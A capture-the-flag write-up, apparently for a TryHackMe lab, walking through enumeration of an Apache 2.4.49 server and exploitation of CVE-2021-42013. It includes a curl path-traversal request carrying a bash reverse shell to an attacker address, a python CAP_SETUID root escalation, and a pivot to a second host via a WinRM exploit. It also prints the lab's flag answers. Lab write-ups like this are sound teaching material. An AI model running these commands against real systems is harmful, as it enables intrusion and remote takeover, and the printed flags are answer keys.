@@ -1,0 +1,89 @@
+We already know this is a web server, but before we poke around in our browser let's set our trusty nmap to run while we take a look.
+
+nmap -vvvv -A -oN scan -p- $TARGET
+
+While that runs, let's hop over to port 80. The web page just says "It works!" and the page source doesn't reveal much of use either.
+
+Time to enumerate web directories:
+
+gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -t 64
+
+This reveals two things: /cgi-bin/ (which is forbidden) and /index.html which is just the homepage.
+
+So far our nmap scan has revealed port 80 (duh) and port 22. Name a more iconic duo, I'll wait. I didn't tell nmap to be fast and aggressive, so it's gonna be a little while longer before I can see details on which versions of these services are running. In the meantime, let's see what Nikto's got to say.
+
+nikto -host $TARGET
+
+Looks like we've got an Apache 2.4.49 server. Let's plug that into searchsploit and see what we get.
+
+There's a PHP exploit that allows for RCE via the cgi-bin directory. If that's not promising, I don't know what is. Let's grab it and stick it in our current directory.
+
+searchsploit -m 29290
+
+Now, how to use this? Let's take a look back at our target web server.
+
+Wait a minute, what's this? Now it's showing a landing page for a dummy consulting business. Well, this is rather more helpful than "It works!"
+
+I guess I didn't wait long enough originally for all the services on the machine to fully boot up. We live and learn.
+
+Anyway, let's poke around and see what new stuff we can find. Starting with another gobuster pass, we also get an /assets directory. The only really interesting thing that jumps out here is a file called .DS_Store, which we can download.
+
+Catting out DS_Store gives us mostly gibberish; using strings doesn't help much either. It seems to mostly be stuff related to CSS or just more gibberish. The final string is DSDB, which might relate to a database of some kind, but I'm not optimistic.
+
+The /cgi-bin directory is still there, and at the bottom of the homepage is a contact form.
+
+After a lot more poking around and headscratching, it turns out that Apache 2.4.49 is also associated with CVE-2021-42013. This allows for path traversal and RCE if CGI scripts are enabled.
+
+How did I miss this, you ask? Well, it's because proper enumeration is half the battle. Learn from my errors! Enumerate ad nauseum.
+
+Anyway, we know that /cgi-bin/ is active because we get a 403 when we try to access it. Let's use curl to traverse some paths and spawn a shell.
+
+Standard listener on our machine:
+
+nc -lvnp 4444
+
+And a curl request using path traversal to get to /bin/bash on the target:
+
+curl 'http://[TARGET IP]/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/[ATTACKING IP]/4444 0>&1' -H "Content-Type: text/plain"
+
+Bing bang boom, welcome to the target machine, daemon.
+
+We're in the /bin/ directory, and there doesn't appear to be a lot that immediately jumps out as interesting. But after running through a few different methods of privesc enumeration, we find that python has the CAP_SETUID capability set. That means we can do this:
+
+python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# whoami
+root
+
+Tremendous! Let's cat /root/user.txt:
+
+THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
+
+There's our user flag. But where's the root flag?
+
+find / -type f -name root.txt 2>/dev/null returns nothing.
+
+I'll skip over everything I went through here that went nowhere, but take this lesson: you can do a lot of enumeration without finding anything of value, but it only takes finding the right thing once.
+
+Check out ifconfig - there's another machine on 172.17.0.1!
+
+Normally our first order of business when confronted with a new machine is to scan it with nmap, but the machine we've just rooted doesn't have nmap installed, and apt install isn't too helpful. Eventually I worked out that we need to set up a python web server on our attacking machine to get a static nmap binary onto our secondary one.
+
+python -m http.server 8000
+
+curl http://[ATTACKING IP]:8000/nmap -o nmap_
+
+Now we can scan this mysterious other machine.
+
+./nmap_ 172.17.0.1 -p- --min-rate 5000
+
+Port 5986 open? That's certainly not standard. Let's see what we can find on Google.
+
+Turns out this port being open signals that WinRM is configured on the machine, and there's a CVE with a handily available script on GitHub. We can use the same python web server method to get it on our secondary attacker, then run it to pop RCE on the new target.
+
+python3 exploit.py -t 172.17.0.1 -c "cat /root/root.txt"
+
+THM{7f147ef1f36da9ae29529890a1b6011f}
+
+And we're done!
+
+Fellas, I'll be honest, this one took me for a ride. I learned this lesson so you hopefully don't have to: ENUMERATE AD NAUSEUM.
